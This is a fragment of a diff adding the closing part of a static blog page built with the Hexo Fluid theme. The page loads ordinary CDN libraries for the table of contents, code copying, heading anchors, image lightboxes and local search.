+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
